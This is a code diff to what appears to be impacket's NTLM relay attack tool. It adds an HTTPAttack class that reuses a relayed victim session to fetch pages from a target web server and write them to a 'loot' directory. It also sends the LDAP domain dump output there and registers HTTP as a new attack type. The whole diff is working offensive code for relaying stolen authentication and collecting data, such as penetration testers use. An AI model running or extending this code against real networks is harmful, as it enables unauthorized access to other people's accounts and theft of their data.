@@ -41,6 +41,8 @@ import thread
 import logging
 import random
 import string
+import re
+import os
 from threading import Thread
 
 from impacket import version, smb3, smb
@@ -170,11 +172,12 @@ class LDAPAttack(Thread):
         else:
             logging.error('Failed to add user to Domain Admins group: %s' % str(self.c.result))
 
-
     def run(self):
         global dumpeddomain
         #Set up a default config
         ddc = self.ldapdomaindump.domainDumpConfig()
+        #Change the output directory to configured rootdir
+        ddc.basepath = self.config.lootdir
         #Create new dumper object
         self.dd = self.ldapdomaindump.domainDumper(self.client.s,self.client.c,ddc)
         isda = self.dd.isDomainAdmin(self.username)
@@ -188,12 +191,37 @@ class LDAPAttack(Thread):
                 self.dd.domainDump()
                 dumpeddomain = True
 
+class HTTPAttack(Thread):
+    def __init__(self, config, HTTPClient, username):
+        Thread.__init__(self)
+        self.daemon = True
+        self.config = config
+        self.client = HTTPClient
+        self.username = username
+
+    def run(self):
+        #Default action: Dump requested page to file, named username-targetname.html
+
+        #You can also request any page on the server via self.client.session,
+        #for example with: 
+        #result = self.client.session.get('http://secretserver/secretpage.html')
+        #print result.content
+
+        #Remove protocol from target name
+        safeTargetName = self.client.target.replace('http://','').replace('https://','')
+        #Replace any special chars in the target name
+        safeTargetName = re.sub(r'[^a-zA-Z0-9_\-\.]+', '_', safeTargetName)
+        #Combine username with filename
+        fileName = re.sub(r'[^a-zA-Z0-9_\-\.]+', '_', self.username.decode('utf-16-le')) + '-' + safeTargetName + '.html'
+        #Write it to the file
+        with open(os.path.join(self.config.lootdir,fileName),'w') as of:
+            of.write(self.client.lastresult.content)
 
 # Process command-line arguments.
 if __name__ == '__main__':
 
     RELAY_SERVERS = ( SMBRelayServer, HTTPRelayServer )
-    ATTACKS = { 'SMB': SMBAttack, 'LDAP': LDAPAttack }
+    ATTACKS = { 'SMB': SMBAttack, 'LDAP': LDAPAttack, 'HTTP': HTTPAttack }
     # Init the example's logger theme
     logger.init()
     print version.BANNER
